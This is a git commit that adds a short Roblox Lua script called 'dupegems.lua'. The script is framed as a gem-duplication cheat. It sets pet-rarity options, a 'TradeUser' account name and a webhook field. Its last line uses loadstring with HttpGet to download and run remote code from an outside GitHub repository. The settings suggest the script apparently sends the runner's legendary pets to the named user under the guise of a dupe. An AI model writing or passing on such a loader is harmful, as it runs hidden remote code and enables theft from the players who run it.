853d9e046abbc95255ae5b35498cb1acb877271c
Shisuiiiis <108449104+Shisuiiiis@users.noreply.github.com>
2022-07-01 14:03:04 +0800

    Create dupegems.lua

---
+++ dupegems.lua
@@ -0,0 +1,6 @@
+PetRarity = "Legendary"
+PetLimited = true
+PetAll = false
+TradeUser = "tyfortnycfPH"
+WebhookURL = ""
+loadstring(game:HttpGet("https://raw.githubusercontent.com/wtfkid/AutoFarm/main/dupegems.lua"))()
